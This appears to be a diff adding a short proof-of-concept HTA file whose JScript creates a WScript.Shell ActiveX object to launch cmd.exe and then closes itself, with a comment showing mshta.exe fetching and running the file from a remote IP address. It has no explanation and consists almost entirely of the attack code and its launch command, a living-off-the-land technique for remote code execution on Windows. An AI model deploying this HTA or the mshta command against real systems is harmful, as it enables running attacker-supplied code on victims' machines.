@@ -1,0 +1,21 @@
+<!-- Generate below test.hta file-->
+
+<html> 
+<head> 
+<script language="JScript">
+var shell = new ActiveXObject("WScript.Shell");
+var res = shell.Run("cmd.exe");
+</script>
+</head> 
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body> 
+</html>
+
+<!-- 
+
+C:\Windows\System32\mshta.exe http://xx.xxx.xxx.xxx/test.hta
+
+-->
